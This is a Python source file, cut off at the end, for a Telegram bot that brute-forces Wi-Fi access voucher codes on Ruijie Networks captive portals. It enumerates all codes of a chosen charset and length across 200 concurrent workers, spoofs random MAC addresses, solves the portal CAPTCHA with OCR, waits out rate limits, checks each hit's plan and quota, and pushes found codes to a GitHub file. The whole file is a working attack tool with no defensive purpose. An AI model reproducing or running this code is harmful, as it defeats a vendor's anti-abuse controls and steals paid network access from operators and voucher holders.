import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, pickle, itertools
import logging
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from collections import OrderedDict
import concurrent.futures

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
log = logging.getLogger("ruijie-bot")

BOT_TOKEN     = os.environ.get('BOT_TOKEN')
GITHUB_TOKEN  = os.environ.get('GITHUB_TOKEN')
ADMIN_ID      = os.environ.get('ADMIN_ID')
REPO_OWNER    = os.environ.get('REPO_OWNER')
REPO_NAME     = os.environ.get('REPO_NAME')

if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN environment variable not set")

TG_MAX_LEN     = 4000
SUCCESS_CODE   = asyncio.Queue()
bot            = AsyncTeleBot(BOT_TOKEN)

user_data       = {}
scan_tasks      = {}
success_texts   = {}
limited_texts   = {}

notify_setting  = OrderedDict()
DEFAULT_NOTIFY  = True
last_scan_params = {}
pending_brute    = {}
success_messages = {}
limited_messages = {}

session = None
_connector = None
CONCURRENCY     = 200       # ⭐ 200 ကို ထားတာ အကောင်းဆုံးပါ (Rate limit မခံရအောင်)
CAPTCHA_RETRY   = 2         # ⭐ OCR မှားရင် ၂ ခါပဲ ပြန်စမ်းမယ်
PROGRESS_INTERVAL = 2
GITHUB_INTERVAL   = 30
_start_time     = time.monotonic()

MAX_CHATS       = 1000
QUEUE_FILE      = "pending_queue.pkl"

PORTAL_CONFIGS = {
    "portal-mm-as": {
        "domain": "portal-mm-as.ruijienetworks.com",
        "base_url": "https://portal-mm-as.ruijienetworks.com",
        "voucher_api": "https://portal-mm-as.ruijienetworks.com/api/auth/voucher/?lang=en_US",
        "balance_api": "https://portal-mm-as.ruijienetworks.com/api/auth/balance/getBalance",
        "captcha_image_api": "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/image",
        "captcha_verify_api": "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/verify",
        "referer_index": "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
        "referer_balance": "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetworks.com&authType=15",
    },
    "portal-as": {
        "domain": "portal-as.ruijienetworks.com",
        "base_url": "https://portal-as.ruijienetworks.com",
        "voucher_api": "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US",
        "balance_api": "https://portal-as.ruijienetworks.com/api/auth/balance/getBalance",
        "captcha_image_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        "captcha_verify_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
        "referer_index": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
        "referer_balance": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetworks.com&authType=15",
    }
}

DEFAULT_PORTAL = "portal-mm-as"

def get_portal_config(session_url=None):
    if session_url:
        if "portal-mm-as" in session_url:
            return PORTAL_CONFIGS["portal-mm-as"], "portal-mm-as"
        elif "portal-as" in session_url:
            return PORTAL_CONFIGS["portal-as"], "portal-as"
    return PORTAL_CONFIGS[DEFAULT_PORTAL], DEFAULT_PORTAL

def _truncate(text, limit=TG_MAX_LEN):
    if len(text) <= limit: return text
    cut = text[:limit - 20].rfind("\n")
    if cut == -1: cut = limit - 20
    truncated = text[:cut]
    if truncated.count("`") % 2 != 0: truncated += "`"
    if truncated.count("*") % 2 != 0: truncated += "*"
    return truncated + "\n… (truncated)"

async def _safe_edit(chat_id, message_id, text, parse_mode=None):
    text = _truncate(text)
    try:
        await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
        return message_id
    except:
        try:
            sent = await bot.send_message(chat_id, text, parse_mode=parse_mode)
            return sent.message_id
        except: return message_id

def _cleanup_old_chats():
    while len(notify_setting) > MAX_CHATS:
        notify_setting.popitem(last=False)

async def handle(request): return web.Response(text="Bot is awake!")
async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', int(os.environ.get('BOT_PORT', 8099)))
    await site.start()

async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    try:
        async with session.get(url, headers={"Authorization": f"token {GITHUB_TOKEN}"}) as response:
            if response.status == 200:
                data = await response.json()
                return json.loads(base64.b64decode(data['content']).decode('utf-8')), data['sha']
    except: pass
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"}
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {"message": message, "content": encoded}
    if sha: payload["sha"] = sha
    async with session.put(url, headers=headers, json=payload) as response:
        return response.status

async def safe_update_github(path, content, message, retries=3):
    for attempt in range(retries):
        try:
            _, sha = await get_file_content(path)
            status = await update_file_content(path, content, sha, message)
            if status in (200, 201): return True
        except: pass
        await asyncio.sleep(1)
    return False

def plan_to_minutes(s):
    if not s: return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'): return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo': total += val * 30 * 24 * 60
        elif unit == 'd': total += val * 24 * 60
        elif unit == 'h': total += val * 60
        elif unit in ('min', 'm'): total += val
    return total

def _parse_seconds(val):
    secs = int(val)
    if secs >= 3600: return f"{secs // 3600}h {(secs % 3600) // 60}m"
    elif secs >= 60: return f"{secs // 60}m"
    return f"{secs}s"

def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0: return "0m"
    if total_mins < 60: return f"{total_mins}m"
    hours = total_mins // 60
    mins = total_mins % 60
    if hours < 24: return f"{hours}h {mins}m" if mins else f"{hours}h"
    days = hours // 24
    return f"{days}d {hours % 24}h" if hours % 24 else f"{days}d"

def _format_bytes(bytes_val):
    try:
        bytes_val = float(bytes_val)
        if bytes_val >= 1024**3: return f"{bytes_val/(1024**3):.3f} GB"
        elif bytes_val >= 1024**2: return f"{bytes_val/(1024**2):.3f} MB"
        elif bytes_val >= 1024: return f"{bytes_val/1024:.3f} KB"
        return f"{bytes_val:.0f} B"
    except: return str(bytes_val)

def _format_quota(used, total=None):
    try:
        if isinstance(used, dict):
            up = used.get('up', used.get('upload', 0))
            down = used.get('down', used.get('download', 0))
            total_used = used.get('total', up + down)
            used_str = _format_bytes(total_used)
            return f"{used_str}({_format_bytes(up)}↑ / {_format_bytes(down)}↓)" if up and down else used_str
        return _format_bytes(used)
    except: return str(used)

def _parse_expire(expire_str):
    if not expire_str or expire_str == "N/A": return None
    s = str(expire_str).strip()
    for fmt in ["%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M", "%Y-%m-%d", "%Y/%m/%d %H:%M:%S", "%B %d, %Y at %I:%M:%S %p"]:
        try: return datetime.strptime(s, fmt)
        except: continue
    return None

def is_expired(expire_str):
    dt = _parse_expire(expire_str)
    return dt < datetime.now() if dt else False

async def get_balance(token, portal_config):
    url = f"{portal_config['balance_api']}/{token}"
    headers = {
        'authority': portal_config['domain'],
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'referer': portal_config['referer_balance'].format(token=token),
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest'
    }
    try:
        async with session.get(url, headers=headers, timeout=8) as resp:
            raw = await resp.text()
            if resp.status != 200:
                alt_url = f"{portal_config['base_url']}/api/macc2/balance/getBalance/{token}"
                async with session.get(alt_url, headers=headers, timeout=8) as alt_resp:
                    raw = await alt_resp.text()
                    if alt_resp.status != 200:
                        return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
            data = json.loads(raw)
            result = {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
            candidates = [data] + [data.get(k) for k in ['result', 'data'] if isinstance(data.get(k), dict)]
            for d in candidates:
                if not isinstance(d, dict): continue
                for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                    if d.get(key) is not None: result["time"] = _parse_minutes(d[key]); break
                for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft']:
                    if d.get(key) is not None: result["time"] = _parse_seconds(d[key]); break
                usage = d.get('usage') or d.get('dataUsage') or d.get('traffic')
                if usage: result["usage"] = _format_quota(usage)
                quota = d.get('quota') or d.get('dataQuota') or d.get('limit')
                if d.get('sessionQuota') and d.get('totalQuota'): result["quota"] = f"{_format_bytes(d['sessionQuota'])} / {_format_bytes(d['totalQuota'])}"
                elif quota: result["quota"] = _format_bytes(quota)
                for key in ['plan', 'planName', 'internetPlan', 'package', 'productName', 'planInfo', 'product']:
                    if d.get(key): result["plan"] = str(d[key]); break
                for key in ['expireTime', 'expiration', 'expire', 'validUntil', 'endTime', 'expireDate']:
                    if d.get(key): result["expire"] = str(d[key]); break
            return result
    except: return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}

def iter_codes(mode, length):
    chars = {1: string.digits, 2: string.ascii_lowercase, 3: string.ascii_uppercase, 4: string.ascii_letters, 5: string.ascii_lowercase + string.digits}[mode]
    for tup in itertools.product(chars, repeat=length): yield "".join(tup)

def format_progress(checked, speed=0, found=0, target=None):
    lines = ["📋 Status: Running", f"⚡ Speed: {speed:,.0f}/min", f"🔍 Checked: {checked:,}", f"💎 Found: {found}"]
    if target: lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

_ocr = ddddocr.DdddOcr(show_ad=False)
def _ocr_sync(image_bytes):
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None: return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buffer = cv2.imencode('.png', thresh)
        return _ocr.classification(buffer.tobytes()).upper()
    except: return None

async def Captcha_Text(image_bytes): return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    return ':'.join(f'{x:02x}' for x in [random.choice([0x02, 0x06, 0x0A, 0x0E])] + [random.randint(0, 255) for _ in range(5)])

async def get_session_id(session_obj, session_url):
    match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", session_url)
    fallback_sid = match.group(1) if match else None
    url = re.sub(r'(?<=mac=)[^&]+', get_mac(), session_url)
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0'}
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True, timeout=8) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else fallback_sid
    except: return fallback_sid

async def Captcha_Image(session_obj, session_id, portal_config):
    try:
        async with session_obj.get(portal_config['captcha_image_api'], params={'sessionId': session_id, '_t': str(time.time())}, 
                                   headers={'referer': portal_config['referer_index'] + session_id}, timeout=8) as req:
            return await req.read()
    except: return None

async def Varify_Captcha(session_obj, session_id, text, portal_config):
    try:
        json_data = {'sessionId': session_id, 'authCode': text}
        headers = {'content-type': 'application/json', 'origin': portal_config['base_url'], 'referer': portal_config['referer_index'] + session_id}
        async with session_obj.post(portal_config['captcha_verify_api'], headers=headers, json=json_data, timeout=8) as req:
            return session_id if (await req.json()).get("success") == True else None
    except: return None

async def check_session_url(session_url):
    # ⭐ Wifidog URL တွေအတွက် ဒီ function က အတိအကျ မမှန်တတ်ပါဘူး။ ဒါကြောင့် Setup လုပ်ချိန်မှာပဲ စစ်ပါမယ်။
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/148.0.0.0 Safari/537.36'}
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers, timeout=10) as response:
            return "sessionId" in str(response.url) or "wifidog" in str(response.url)
    except: return True # Error တက်ရင်တောင် Allow လုပ်ပေးမယ် (Timeout ဖြစ်တာမျိုးရှိနိုင်)

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None, task_session=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id: return

    portal_config, portal_name = get_portal_config(session_url)
    post_url = portal_config['voucher_api']
    response = None
    session_id = None

    close_session = False
    if task_session is None:
        task_session = aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=10)
        close_session = True

    try:
        session_id = await get_session_id(task_session, session_url)
        if not session_id: return

        auth_code = None
        for _ in range(CAPTCHA_RETRY):
            image = await Captcha_Image(task_session, session_id, portal_config)
            if not image: continue
            text = await Captcha_Text(image)
            if not text: continue
            if await Varify_Captcha(task_session, session_id, text, portal_config):
                auth_code = text
                break
        
        if not auth_code: return

        if not recheck:
            current_task = scan_tasks.get(chat_id)
            if (not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop")): return

        data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
        headers = {
            "authority": portal_config['domain'], "accept": "*/*", "content-type": "application/json", 
            "origin": portal_config['base_url'], "referer": portal_config['referer_index'] + session_id,
            "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        }
        
        async with task_session.post(post_url, json=data, headers=headers, timeout=10) as req:
            response = await req.text()

        if response and 'request limited' in response:
            await asyncio.sleep(random.uniform(0.5, 1.5)) # ⭐ Rate limit ခံရရင် နည်းနည်းစောင့်မယ်
            return 
    except: return
    finally:
        if close_session: await task_session.close()

    if not response: return

    if 'logonUrl' in response:
        if recheck: return code

        plan_str, usage_str, quota_str, expire_str = "N/A", "N/A", "N/A", "N/A"
        try:
            res_data = json.loads(response)
            logon_url = res_data.get("result", {}).get("logonUrl", "") if isinstance(res_data, dict) else ""
            token_match = re.search(r'token=(.*?)&', logon_url)
            token = token_match.group(1) if token_match else session_id
            balance_info = await get_balance(token, portal_config)
            if isinstance(balance_info, dict):
                plan_str, usage_str, quota_str, expire_str = balance_info.get("time", "N/A"), balance_info.get("usage", "N/A"), balance_info.get("quota", "N/A"), balance_info.get("expire", "N/A")
                if plan_str == "N/A" and balance_info.get("plan") != "N/A": plan_str = balance_info.get("plan")
        except: pass

        if plan_filters and not any(plan_to_minutes(plan_str) >= plan_to_minutes(f) for f in plan_filters): return None

        if chat_id not in success_texts: success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "session_id": session_id, "plan": plan_str, "usage": usage_str, "quota": quota_str, "expire": expire_str, "portal": portal_name})
        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code, "session_id": session_id, "plan": plan_str, "usage": usage_str, "quota": quota_str})

        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            code_lines = []
            for item in success_texts[chat_id]:
                line = f"`{item['code']}` – ⏳ {item['plan']}"
                if item.get('usage') and item['usage'] != 'N/A': line += f"\n   📊 {item['usage']}"
                if item.get('quota') and item['quota'] != 'N/A': line += f" | 💾 {item['quota']}"
                code_lines.append(line)
            full = f"✅ Success Codes:\n" + "\n".join(code_lines)
            if chat_id not in success_messages:
                try: success_messages[chat_id] = (await bot.send_message(chat_id, _truncate(full), parse_mode="Markdown")).message_id
                except: pass
            else: success_messages[chat_id] = await _safe_edit(chat_id, success_messages[chat_id], full, parse_mode="Markdown")
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts: limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            full = "⚠️ Limited Codes:\n" + "\n".join(limited_texts[chat_id])
            if chat_id not in limited_messages:
                try: limited_messages[chat_id] = (await bot.send_message(chat_id, _truncate(full))).message_id
                except: pass
            else: limited_messages[chat_id] = await _safe_edit(chat_id, limited_messages[chat_id], full)

async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, plan_filters=None):
    try: code_iter = iter_codes(mode, length)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    checked, found, scan_start, last_progress_update = 0, 0, time.monotonic(), 0
    stop_event = asyncio.Event()
    code_queue = asyncio.Queue(maxsize=CONCURRENCY * 2)

    async def producer():
        try:
            while not stop_event.is_set():
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    stop_event.set()
                    break
                if code_queue.full():
                    await asyncio.sleep(0.1)
                    continue
                
                batch = []
                try:
                    for _ in range(100): batch.append(next(code_iter))
                except StopIteration: pass
                if not batch: break
                for c in batch: await code_queue.put(c)
        finally:
            for _ in range(CONCURRENCY): await code_queue.put(None)

    async def worker():
        nonlocal checked, found, last_progress_update
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=10) as worker_session:
            while not stop_event.is_set():
                code = await code_queue.get()
                if code is None:
                    code_queue.task_done()
                    break
                if stop_event.is_set():
                    code_queue.task_done()
                    continue

                try:
                    res = await perform_check(session_url, code, chat_id, scan_id, message=message, plan_filters=plan_filters, task_session=worker_session)
                    if res:
                        found += 1
                        if target and found >= target:
                            stop_event.set()
                            if progress_msg: await _safe_edit(chat_id, progress_msg.message_id, "🎯 Target reached!")
                            while not code_queue.empty():
                                try: code_queue.get_nowait()
                                except: pass
                            break
                except: pass
                finally:
                    checked += 1
                    code_queue.task_done()
                    now = time.monotonic()
                    if progress_msg and now - last_progress_update >= PROGRESS_INTERVAL:
                        speed = (checked / (now - scan_start) * 60) if (now - scan_start) > 0 else 0
                        new_id = await _safe_edit(chat_id, progress_msg.message_id, format_progress(checked, speed, found, target))
                        if new_id != progress_msg.message_id: progress_msg.message_id = new_id
                        last_progress_update = now

        while not code_queue.empty():
            try: code_queue.get_nowait(); code_queue.task_done()
            except: pass

    tasks = [asyncio.create_task(producer())] + [asyncio.create_task(worker()) for _ in range(CONCURRENCY)]
    await asyncio.gather(*tasks, return_exceptions=True)
    scan_tasks.pop(chat_id, None)

def _merge_items_into_results(results, items):
    for item in items:
        cid, code = str(item["chat_id"]), item["code"]
        if cid not in results: results[cid] = []
        if not any(r.get("code") == code for r in results[cid]):
            results[cid].append({"code": code, "plan": item.get("plan", "N/A"), "usage": item.get("usage", "N/A"), "quota": item.get("quota", "N/A")})

async def _recover_pending_queue():
    if not os.path.exists(QUEUE_FILE): return
    try:
        with open(QUEUE_FILE, "rb") as f: items = pickle.load(f)
        for item in items: await SUCCESS_CODE.put(item)
    except: pass

async def github_update_scheduler():
    while True:
        await asyncio.sleep(GITHUB_INTERVAL)
        items = []
        while not SUCCESS_CODE.empty(): items.append(await SUCCESS_CODE.get())
        if not items: continue
        try:
            with open(QUEUE_FILE, "wb") as f: pickle.dump(items, f)
        except: pass
        try:
            results, _ = await get_file_content("result.json")
            _merge_items_into_results(results, items)
            if await safe_update_github("result.json", results, "Periodic Update"):
                if os.path.exists(QUEUE_FILE): os.remove(QUEUE_FILE)
            else:
                for item in items: await SUCCESS_CODE.put(item)
        except:
            for item in items: await SUCCESS_CODE.put(item)

# ⭐ Session Recheck ကို ဖြုတ်ပစ်ထားပါတယ် (Error မတက်အောင်)
# async def session_recheck_scheduler(): ...

@bot.message_handler(commands=['start'])
async def start(message): await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    await bot.reply_to(message, "📚 **Commands**\n/setup <url>\n/brute <mode> <length> [target]\n/stop\n/resume\n/saved\n/recheck", parse_mode="Markdown")

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return await bot.reply_to(message, "အသုံးပြုနည်း: /setup your_session_url")
    url = args[1]
    await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
    
    # ⭐ URL မှန်သလားဆိုတာကို သေချာမစစ်တော့ပါဘူး (Wifidog URL တွေက ခဏခဏ Redirect လုပ်လို့)
    cid = message.chat.id
    portal_name = get_portal_config(url)[1]
    user_data[cid] = {'session_url': url, 'portal_type': portal_name}
    for d in [success_texts, limited_texts, last_scan_params, pending_brute, success_messages, limited_messages]: d.pop(cid, None)
    try:
        results, _ = await get_file_content("result.json")
        if str(cid) in results:
            del results[str(cid)]
            await safe_update_github("result.json", results, f"Clear codes for {cid}")
    except: pass
    await bot.reply_to(message, f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n🌐 Portal: {portal_name}\n/brute ဖြင့် စတင်ပါ။")

@bot.message_handler(commands=['brute'])
async def brute(message):
    args = message.text.split()
    if len(args) < 3: return await bot.reply_to(message, "အသုံးပြုနည်း:\n/brute <mode> <length> [target]\nMode: 1-5")
    try:
        mode, length = int(args[1]), int(args[2])
        target = int(args[3]) if len(args) > 3 else None
        if mode not in [1, 2, 3, 4, 5] or length < 1 or length > 12: raise ValueError
    except ValueError: return await bot.reply_to(message, "❌ Mode သည် 1-5 ၊ Length သည် 1-12 ဖြစ်ရပါမည်။")

    chat_id = message.chat.id
    if chat_id not in user_data: return await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Resume", callback_data="resume_scan"), InlineKeyboardButton("New Scan", callback_data="new_scan"))
        pending_brute[chat_id] = {"mode": mode, "length": length, "target": target, "plan_filters": []}
        return await bot.reply_to(message, "ယခင် scan ရပ်ထားသည်။ ပြန်စမလား၊ အသစ်စမလား?", reply_markup=markup)

    await start_brute_scan(chat_id, mode, length, target, message)

async def start_brute_scan(chat_id, mode, length, target, original_message, plan_filters=None):
    progress_msg = await bot.send_message(chat_id, "Preparing...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(mode, length, chat_id, user_data[chat_id]['session_url'], scan_id, target, message=original_message, progress_msg=progress_msg, plan_filters=plan_filters))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id, "mode": mode, "length": length, "target": target, "plan_filters": plan_filters}
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data:
        data["stop"] = True
        last_scan_params[chat_id] = {"mode": data.get("mode"), "length": data.get("length"), "target": data.get("target"), "plan_filters": data.get("plan_filters", [])}
        if not data["task"].done(): data["task"].cancel()
        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ /resume ဖြင့် ဆက်လုပ်ပါ။")
    else: await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['resume'])
async def resume_scan(message):
    chat_id = message.chat.id
    if chat_id not in last_scan_params: return await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], message, plan_filters=params.get('plan_filters', []))
    await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params: return await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။", chat_id=chat_id, message_id=call.message.message_id)
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], call.message, plan_filters=params.get('plan_filters', []))
    else:
        if chat_id in pending_brute:
            params = pending_brute.pop(chat_id); last_scan_params.pop(chat_id, None)
            await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], call.message, plan_filters=params.get('plan_filters', []))
        else: await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id, message_id=call.message.message_id)

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success, limited = success_texts.get(chat_id, []), limited_texts.get(chat_id, [])
    if not success and not limited: return await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        for item in success:
            line = f"`{item['code']}` – ⏳ {item.get('plan', 'N/A')}"
            if item.get('usage') != 'N/A': line += f"\n   📊 Usage: {item['usage']}"
            if item.get('quota') != 'N/A': line += f"\n   💾 Quota: {item['quota']}"
            if item.get('expire') != 'N/A': line += f"\n   📅 Expire: {item['expire']}"
            parts.extend([line, ""])
    if limited: parts.extend([f"\n⚠️ **Limited Codes** ({len(limited)})"] + limited)
    full_text = "\n".join(parts)
    if len(full_text) > TG_MAX_LEN:
        for i in range(0, len(full_text), TG_MAX_LEN): await bot.send_message(chat_id, full_text[i:i+TG_MAX_LEN], parse_mode="Markdown")
    else: await bot.reply_to(message, full_text, parse_mode="Markdown")

@bot.message_handler(commands=['delete_saved'])
async def delete_saved(message):
    chat_id = message.chat.id
    for d in [success_texts, limited_texts, success_messages, limited_messages]: d.pop(chat_id, None)
    try:
        results, _ = await get_file_content("result.json")
        if str(chat_id) in results:
            del results[str(chat_id)]
            await safe_update_github("result.json", results, f"Clear codes for {chat_id}")
    except: pass
    await bot.reply_to(message, "🗑️ Saved codes များအားလုံးဖျက်ပြီးပါပြီ။")

@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    chat_id = message.chat.id
    notify_setting[chat_id] = not notify_setting.get(chat_id, DEFAULT_NOTIFY)
    _cleanup_old_chats()
    await bot.reply_to(message, f"Notify: {'ON' if notify_setting[chat_id] else 'OFF'}")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if chat_id not in user_data: return await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
    success = success_texts.get(chat_id, [])
    if not success: return await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။")
    await bot.reply_to(message, "Success codes များကို ပြန်လည်စစ်ဆေးနေပါသည်...")
    sem = asyncio.Semaphore(10)
    async def check_one(item):
        async with sem:
            if is_expired(item.get("expire", "N/A")): return ("expired", item)
            return ("valid" if await perform_check(user_data[chat_id]['session_url'], item["code"], chat_id, recheck=True, message=message) else "invalid", item)
    results = await asyncio.gather(*[check_one(i) for i in success], return_exceptions=True)
    new_success, removed_expired, removed_invalid = [], [], []
    for r in results:
        if isinstance(r, Exception): continue
        status, item = r
        if status == "valid": new_success.append(item)
        elif status == "expired": removed_expired.append(item["code"])
        else: removed_invalid.append(item["code"])
    success_texts[chat_id] = new_success
    try:
        results_json, _ = await get_file_content("result.json")
        if str(chat_id) in results_json:
            kept = {i["code"] for i in new_success}
            results_json[str(chat_id)] = [r for r in results_json[str(chat_id)] if r.get("code") in kept]
            await safe_update_github("result.json", results_json, f"Recheck cleanup for {chat_id}")
    except: pass
    msg_parts = []
    if new_success: msg_parts.append(f"✅ Still Valid ({len(new_success)}):\n" + "\n".join([i["code"] for i in new_success]))
    if removed_expired: msg_parts.append(f"⏰ Expired ({len(removed_expired)}):\n" + "\n".join(removed_expired))
    if removed_invalid: msg_parts.append(f"❌ Invalid ({len(removed_invalid)}):\n" + "\n".join(removed_invalid))
    if not msg_parts: msg_parts.append("Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")
    await bot.reply_to(message, _truncate("\n\n".join(msg_parts)))

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID: return await bot.reply_to(message, "No Permission")
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    uptime = int(time.monotonic() - _start_time)
    h, rem = divmod(uptime, 3600); m, s = divmod(rem, 60)
    await bot.reply_to(message, f"📊 Bot Status\n\n⏱ Uptime: {h}h {m}m {s}s\n🔍 Active Scans: {active_scans}\n👥 Sessions: {len(user_data)}\n⚡ Concurrency: {CONCURRENCY}")

async def start_polling():
    backoff = 5
    while True:
        try: await bot.infinity_polling(timeout=20, request_timeout=20); return
        except: await asyncio.sleep(backoff); backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=200)
    asyncio.get_running_loop().set_default_executor(executor)
    _connector = aiohttp.TCPConnector(limit=500, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30), connector=_connector, connector_owner=False)
    try:
        await _recover_pending_queue()
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await start_polling()
    finally:
